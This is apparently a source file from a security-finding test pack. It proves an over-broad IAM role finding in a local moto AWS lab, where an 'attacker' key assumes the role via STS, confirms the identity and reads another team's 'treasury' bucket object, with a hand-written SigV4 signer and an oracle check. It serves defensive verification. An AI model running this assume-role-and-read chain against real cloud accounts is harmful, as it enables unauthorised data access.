// The live-cloud side of this pack: the `http` proof for a role that can read
// every bucket.
//
// The finding is still gated by the `evidence` check against the pinned
// snapshot, and prove() runs that check before this replay starts. This file
// adds the harm: a private moto cloud is seeded from the SAME pinned
// policy, an attacker credential assumes the role, and the assumed credential
// reads a bucket that is not the workload's own. Moto runs with IAM enforced,
// so a narrower policy really does fail here.
//
// The service is reached only through lib/proof-http.mjs: the script container
// joins the outer private network and every call crosses the recording proxy.
// No host port and no raw socket from this process. See packs/README.md.
import { loadSnapshot } from "../../lib/proof-evidence.mjs";
import { httpProof } from "../../lib/proof-http.mjs";
import { attachedRole, parseResources } from "./checks.mjs";

export const LIVE_IMAGE = "touchstone/infra-cloud-cloud-lab:wave2";
export const LIVE_CHECK = "iam-role-broad-object-read";

// Both buckets are lab constants. The treasury bucket stands in for another
// team's data, so a passing read is data outside the workload's own bucket.
const APP_BUCKET = "touchstone-lab-app";
const TREASURY_BUCKET = "touchstone-lab-treasury";
const TREASURY_KEY = "wallets.json";
const MARKER = "ts-treasury-7f3a";

const documents = (value) => (typeof value === "string" ? JSON.parse(value) : value);

// Seed the lab from the exact documents the finding cites.
export function liveSeed(snapshot, where) {
  const match = /^([^.]+)\.(.+)$/.exec(where?.resource ?? "");
  if (!match) throw new Error("The finding has no resource");
  const resources = parseResources(snapshot).resources;
  const policy = resources.find((r) => r.type === match[1] && r.name === match[2]);
  if (!policy) throw new Error("The cited policy is not in the snapshot");
  const owner = attachedRole(policy, resources);
  if (!owner) throw new Error("The policy is not attached to a role");
  const trust = documents(owner.data.assume_role_policy_document ?? owner.data.AssumeRolePolicyDocument);
  const grant = documents(policy.data.policy ?? policy.data.PolicyDocument);
  return { roleName: owner.name, trust, policy: grant, appBucket: APP_BUCKET, treasuryBucket: TREASURY_BUCKET, treasuryKey: TREASURY_KEY, marker: MARKER };
}

// The request script. SigV4 is written out here because the recording proxy
// rewrites the Host header to the origin it forwards to. The AWS SDK always
// signs the URL host, so its signature breaks at that boundary. This signer
// covers the host the lab really receives (ORIGIN_ALIAS + container port in
// lib/proof-http.mjs). The call still crosses the proxy: only DNS differs.
const SCRIPT = `
const { createHash, createHmac } = await import("node:crypto");
const HOST = "origin:5000", REGION = "us-east-1";
const sha = (text) => createHash("sha256").update(text).digest("hex");
const hmac = (key, text) => createHmac("sha256", key).update(text).digest();
const amzDate = new Date().toISOString().replace(/[-:]|\\.\\d{3}/g, "");
const day = amzDate.slice(0, 8);

// One signed call through request(). Signs exactly the headers it sends.
async function call(method, path, { credentials, service, body = "", token }) {
  const payload = sha(body);
  const headers = { host: HOST, "x-amz-content-sha256": payload, "x-amz-date": amzDate };
  if (token) headers["x-amz-security-token"] = token;
  if (body) headers["content-type"] = "application/x-www-form-urlencoded";
  const names = Object.keys(headers).sort();
  const canonical = [method, path, "", names.map((n) => n + ":" + headers[n] + "\\n").join(""), names.join(";"), payload].join("\\n");
  const scope = day + "/" + REGION + "/" + service + "/aws4_request";
  const key = [REGION, service, "aws4_request"].reduce((k, part) => hmac(k, part), hmac("AWS4" + credentials.secretAccessKey, day));
  const signature = hmac(key, ["AWS4-HMAC-SHA256", amzDate, scope, sha(canonical)].join("\\n")).toString("hex");
  headers.authorization = "AWS4-HMAC-SHA256 Credential=" + credentials.accessKeyId + "/" + scope + ", SignedHeaders=" + names.join(";") + ", Signature=" + signature;
  return request(method, path, { headers, body: body || undefined });
}

const form = (fields) => new URLSearchParams(fields).toString();
const labBody = (await request("GET", "/__lab.json")).resBody;
const lab = typeof labBody === "string" ? JSON.parse(labBody) : labBody;
const attacker = { accessKeyId: lab.accessKeyId, secretAccessKey: lab.secretAccessKey };

// 1. A separate attacker key assumes the role. Only its policy can stop it.
const assumed = (await call("POST", "/", { credentials: attacker, service: "sts",
  body: form({ Action: "AssumeRole", Version: "2011-06-15", RoleArn: lab.roleArn, RoleSessionName: "attacker" }) })).resBody;
const xml = typeof assumed === "string" ? assumed : JSON.stringify(assumed);
const credentials = {
  accessKeyId: /<AccessKeyId>(.*?)<\\/AccessKeyId>/.exec(xml)?.[1],
  secretAccessKey: /<SecretAccessKey>(.*?)<\\/SecretAccessKey>/.exec(xml)?.[1],
  sessionToken: /<SessionToken>(.*?)<\\/SessionToken>/.exec(xml)?.[1],
};
if (!credentials.secretAccessKey) throw new Error("No session credential returned\\n" + xml);
const holder = { credentials, service: "sts", token: credentials.sessionToken };

// 2. Name the identity the credential really has.
await call("POST", "/", { ...holder, body: form({ Action: "GetCallerIdentity", Version: "2011-06-15" }) });

// 3. Read another team's object with that credential.
const read = await call("GET", "/" + lab.treasuryBucket + "/" + lab.treasuryKey, { ...holder, service: "s3" });
console.log("read", lab.treasuryBucket + "/" + lab.treasuryKey, "status", read.status, "has marker:", JSON.stringify(read.resBody).includes(lab.marker));
`;

const text = (value) => (typeof value === "string" ? value : JSON.stringify(value ?? ""));
const header = (entry, name) => {
  const found = Object.entries(entry?.reqHeaders ?? {}).find(([key]) => key.toLowerCase() === name);
  return Array.isArray(found?.[1]) ? found[1][0] : found?.[1];
};

// The oracle reads only what crossed the proxy. Each step must be visible:
// the assume, the identity behind the credential, and the same credential
// reading the object. The read's session token must be the one AssumeRole
// returned, so an unrelated credential that happens to pass cannot carry it.
export function oracle(roleName) {
  return {
    name: "assumed-role-reads-other-bucket",
    check(transcript) {
      const assume = transcript.find((e) => e.status === 200 && text(e.reqBody).includes("Action=AssumeRole&"));
      const xml = text(assume?.resBody);
      const token = /<SessionToken>(.*?)<\/SessionToken>/.exec(xml)?.[1];
      if (!assume || !/<AccessKeyId>/.test(xml) || !token) return { pass: false, detail: "AssumeRole did not return a session credential." };
      const identity = transcript.find((e) => e.status === 200 && text(e.reqBody).includes("Action=GetCallerIdentity"));
      if (!identity || !text(identity.resBody).includes(`assumed-role/${roleName}/`)) return { pass: false, detail: "The session credential is not the cited role." };
      const read = transcript.find((e) => e.method === "GET" && e.path.includes(`/${TREASURY_BUCKET}/${TREASURY_KEY}`));
      if (!read || read.status !== 200) return { pass: false, detail: `${TREASURY_BUCKET}/${TREASURY_KEY} was not readable with the assumed credential.` };
      if (header(read, "x-amz-security-token") !== token) return { pass: false, detail: "The read was not signed with the assumed session." };
      if (!text(read.resBody).includes(MARKER)) return { pass: false, detail: "The read returned no treasury object body." };
      return { pass: true, detail: `A separate attacker key assumed ${roleName}, the credential proved that identity, and the same session read ${TREASURY_BUCKET}/${TREASURY_KEY} (200) with marker ${MARKER}.` };
    },
  };
}

// proofView() redacts header names, never body text. The lab seed and the STS
// XML carry real values, so scrub them out of the stored proof after the oracle
// has read the raw transcript. The recorder parses JSON bodies, so objects are
// walked too. A session token expires, but it stays out of the saved record.
const scrubText = (body) => body
  .replace(/(<SecretAccessKey>)[^<]*(<\/SecretAccessKey>)/g, "$1[REDACTED]$2")
  .replace(/(<SessionToken>)[^<]*(<\/SessionToken>)/g, "$1[REDACTED]$2")
  .replace(/("secretAccessKey"\s*:\s*")[^"]*(")/g, "$1[REDACTED]$2");
const scrub = (value) => {
  if (typeof value === "string") return scrubText(value);
  if (Array.isArray(value)) return value.map(scrub);
  if (value && typeof value === "object") return Object.fromEntries(Object.entries(value).map(([k, v]) => [k, /secret/i.test(k) ? "[REDACTED]" : scrub(v)]));
  return value;
};
const REDACTED_HEADER = /^(?:x-amz-security-token|authorization)$/i;

export function redactProof(proof) {
  return { ...proof, log: proof.log.map((x) => ({
    ...x,
    request: { ...x.request, headers: Object.fromEntries(Object.entries(x.request?.headers ?? {}).map(([k, v]) => [k, REDACTED_HEADER.test(k) ? "[REDACTED]" : v])) },
    response: { ...x.response, body: scrub(x.response?.body) },
  })) };
}

export async function liveProof(ws, finding) {
  const { snapshot } = loadSnapshot(ws);
  const seed = liveSeed(snapshot, finding.evidence?.where);
  const proof = await httpProof(
    { image: LIVE_IMAGE, containerPort: 5000, readyPath: "/healthz", scriptTimeoutMs: 40_000, env: { LAB_SEED: JSON.stringify(seed) } },
    SCRIPT,
    oracle(seed.roleName),
  );
  return redactProof(proof);
}
